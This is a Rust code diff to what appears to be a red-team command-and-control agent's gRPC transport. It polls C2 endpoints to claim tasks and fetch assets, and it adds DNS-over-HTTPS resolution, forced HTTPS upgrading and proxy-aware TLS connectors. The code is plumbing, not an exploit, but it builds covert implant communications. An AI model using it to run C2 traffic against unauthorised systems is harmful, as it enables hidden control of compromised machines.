@@ -8,8 +8,48 @@ use tonic::GrpcMethod;
 use tonic::Request;
 
 use crate::Transport;
+#[cfg(feature = "doh")]
+use crate::dns_resolver::doh::DohProvider;
 
 use std::time::Duration;
+
+#[derive(Clone)]
+struct ForceHttpsConnector<C> {
+    inner: C,
+    force: bool,
+}
+
+impl<C> tower::Service<http::Uri> for ForceHttpsConnector<C>
+where
+    C: tower::Service<http::Uri> + Clone + Send + 'static,
+    C::Response: Send,
+    C::Error: Send,
+    C::Future: Send,
+{
+    type Response = C::Response;
+    type Error = C::Error;
+    type Future = C::Future;
+
+    fn poll_ready(
+        &mut self,
+        cx: &mut std::task::Context<'_>,
+    ) -> std::task::Poll<std::result::Result<(), Self::Error>> {
+        self.inner.poll_ready(cx)
+    }
+
+    fn call(&mut self, uri: http::Uri) -> Self::Future {
+        if self.force {
+            let mut parts = uri.into_parts();
+            if parts.scheme == Some(http::uri::Scheme::HTTP) {
+                parts.scheme = Some(http::uri::Scheme::HTTPS);
+            }
+            let https_uri = http::Uri::from_parts(parts).expect("valid uri");
+            self.inner.call(https_uri)
+        } else {
+            self.inner.call(uri)
+        }
+    }
+}
 
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
@@ -36,10 +76,39 @@ impl Transport for GRPC {
         let callback = crate::transport::extract_uri_from_config(&config)?;
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
-        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
+        // Tonic 0.14+ might fail with "Connecting to HTTPS without TLS enabled" if we use https:// scheme
+        // even if we provide a TLS-enabled connector. We workaround this by using http:// scheme
+        // internally and forcing https:// in the connector.
+        let internal_callback = if callback.starts_with("https://") {
+            callback.replacen("https://", "http://", 1)
+        } else {
+            callback.clone()
+        };
 
-        // Note: DOH is not currently supported for gRPC transport due to hyper 1.x migration
-        // TODO: Add DOH support with hyper 1.x compatible DNS resolver
+        let endpoint = tonic::transport::Endpoint::from_shared(internal_callback)?;
+
+        #[cfg(feature = "doh")]
+        let doh: Option<&String> = extra_map.get("doh");
+
+        // Create base HTTP connector (either DOH-enabled or system DNS)
+        #[cfg(feature = "doh")]
+        let mut http = match doh {
+            Some(provider_str) => {
+                let provider = match provider_str.to_lowercase().as_str() {
+                    "cloudflare" => DohProvider::Cloudflare,
+                    "google" => DohProvider::Google,
+                    "quad9" => DohProvider::Quad9,
+                    _ => DohProvider::System,
+                };
+                crate::dns_resolver::doh::create_doh_connector_hyper1(provider)?
+            }
+            None => {
+                // Use system DNS when DOH not explicitly requested
+                crate::dns_resolver::doh::create_doh_connector_hyper1(DohProvider::System)?
+            }
+        };
+
+        #[cfg(not(feature = "doh"))]
         let mut http = hyper_util::client::legacy::connect::HttpConnector::new();
 
         let proxy_uri = extra_map.get("http_proxy");
@@ -47,13 +116,26 @@ impl Transport for GRPC {
         http.enforce_http(false);
         http.set_nodelay(true);
 
+        let connector = hyper_rustls::HttpsConnectorBuilder::new()
+            .with_provider_and_webpki_roots(rustls::crypto::ring::default_provider())
+            .expect("failed to set rustls provider")
+            .https_or_http()
+            .enable_http2()
+            .wrap_connector(http);
+
+        // Wrap connector to force HTTPS if the original callback was HTTPS
+        let connector = ForceHttpsConnector {
+            inner: connector,
+            force: callback.starts_with("https://"),
+        };
+
         let channel = match proxy_uri {
             Some(proxy_uri_string) => {
                 let proxy = hyper_http_proxy::Proxy::new(
                     hyper_http_proxy::Intercept::All,
                     Uri::from_str(proxy_uri_string.as_str())?,
                 );
-                let proxy_connector = hyper_http_proxy::ProxyConnector::from_proxy(http, proxy)?;
+                let proxy_connector = hyper_http_proxy::ProxyConnector::from_proxy(connector, proxy)?;
 
                 endpoint
                     .rate_limit(1, Duration::from_millis(25))
@@ -62,7 +144,7 @@ impl Transport for GRPC {
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => endpoint
                 .rate_limit(1, Duration::from_millis(25))
-                .connect_with_connector_lazy(http),
+                .connect_with_connector_lazy(connector),
         };
 
         let grpc = tonic::client::Grpc::new(channel);
